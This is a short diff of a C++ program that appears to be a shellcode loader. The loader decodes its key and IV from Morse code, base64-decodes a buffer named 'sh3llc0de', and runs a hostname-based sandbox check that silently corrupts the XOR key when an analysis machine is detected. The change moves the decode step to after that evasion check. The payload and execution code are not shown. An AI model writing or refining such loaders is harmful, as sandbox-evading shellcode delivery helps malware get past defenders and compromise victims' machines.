@@ -239,8 +239,6 @@ int main()
     b64a3siv = translate_morse(morsedb64a3siv);
     xorKey = translate_morse(morsedxorKey);
 
-    decoded = b64.base64_decode(sh3llc0de);
-
     // sandbox check
     string strHostname;
     char name[MAX_COMPUTERNAME_LENGTH + 1];
@@ -252,13 +250,15 @@ int main()
         //std::cout << "hit" << std::endl;
         xorKey.replace(0, 1, "~");
     }
-    
+
     /*
     if (strcmp(name, "DESKTOP-H39OG3S") == 0) {
         std::cout << "Sandbox hit" << std::endl;
         xorKey.replace(0, 1, "P");
     }
     */
+
+    decoded = b64.base64_decode(sh3llc0de);
 
     //xor is already in its own function
     //char x0rek3y[] = "Sup3rS3cur3K3yfTw!";
